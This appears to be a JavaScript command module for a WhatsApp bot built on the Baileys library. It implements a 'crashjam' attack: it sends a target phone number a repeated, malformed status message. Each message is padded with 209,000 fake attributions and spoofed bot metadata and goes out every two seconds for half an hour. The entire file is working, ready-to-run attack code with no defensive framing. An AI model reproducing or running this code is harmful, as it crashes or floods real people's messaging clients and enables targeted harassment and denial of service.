import { isWhitelisted, WHITELIST_BLOCKED_MESSAGE } from "../js/config.js";
import { generateWAMessageFromContent } from "@whiskeysockets/baileys";
import crypto from 'crypto';

export default {
  name: "crashjam",
  description: "Lance un crashjam avec la fonction crashjam",

  background: true,

  async execute(context) {
    const { from, msg, args } = context;
    const sock = () => context.sock;

    const targetNumber = args?.[0] || "";
    const opts = msg ? { quoted: msg } : {};

    if (!targetNumber) {
      return { success: false, message: "Numéro manquant" };
    }

    const number = targetNumber.replace(/[^0-9]/g, "");
    if (number.length < 8) {
      return { success: false, message: "Numéro invalide" };
    }

    if (isWhitelisted(number) || isWhitelisted(targetNumber)) {
      return { success: false, blocked: true, message: WHITELIST_BLOCKED_MESSAGE };
    }

    const target = number + "@s.whatsapp.net";

    try {
      const config = {
        duration: context.durationMs || 30 * 60 * 1000,
        actionInterval: 2000,
        maxPerHour: 3100,
      };

      const startTime = context.startedAt || Date.now();
      const DEADLINE = context.deadline || startTime + config.duration;

      let sent = context.state?.sent || 0;
      let hourCount = context.state?.hourCount || 0;
      let hourStart = context.state?.hourStart || startTime;

      async function crashjam(prim, target) {
        const SABANA_LOVE = {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
            deviceListMetadata: {
              senderKeyIndex: 0,
              senderTimestamp: Date.now(),
              recipientKeyIndex: 0
            }
          },
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: "status@broadcast",
              fromMe: true,
              isQuestion: true,
              forwardedAiBotMessageInfo: {
                botJid: "13135550202@bot",
                botName: "Business Assistant",
                creator: "FLIX"
              },
              statusAttributionType: 2,
              statusAttributions: Array.from({ length: 209000 }, () => ({
                participant: `${
                  ['41','91','90','31','40'][Math.floor(Math.random()*5)]
                }${Math.floor(Math.random()*1e10).toString().padStart(10,'0')}@s.whatsapp.net`,
                type: 1
              }))
            },
            body: {
              text: "",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "kkk",
              version: 3
            }
          }
        };

        const SABIR7718_LOVE_SABANA = {
          viewOnceMessage: {
            message: SABANA_LOVE
          }
        };

        await prim.relayMessage("status@broadcast", SABIR7718_LOVE_SABANA, {
          statusJidList: [target],
          additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }]
          }]
        });
      }

      while (Date.now() < DEADLINE) {
        if (context.isCancelled?.()) break;

        if (Date.now() - hourStart >= 60 * 60 * 1000) {
          hourCount = 0;
          hourStart = Date.now();
        }

        const live = await context.waitForSocket?.();
        if (!live) break;

        if (hourCount < config.maxPerHour) {
          try {
            await crashjam(live, target);
            hourCount++;
            sent++;
          } catch (actionError) {
            console.error("⚠️ crashjam action ratee (" + number + ") :", actionError?.message || actionError);
            context.onStatus?.("Action ratée — nouvelle tentative dans 5 min");
          }
        }

        context.onProgress?.({ sent, hourCount, hourStart });

        await (context.sleep
          ? context.sleep(config.actionInterval)
          : new Promise(r => setTimeout(r, config.actionInterval)));
      }

      const cancelled = !!context.isCancelled?.();
      return {
        success: true,
        cancelled,
        message: cancelled
          ? `Crashjam arrêté sur ${number} (${sent} action(s) envoyée(s))`
          : `Crashjam terminé sur ${number} (${sent} action(s) envoyée(s))`
      };

    } catch (error) {
      console.error("❌ Erreur crashjam :", error);
      return { success: false, message: "Crashjam interrompu" };
    }
  }
};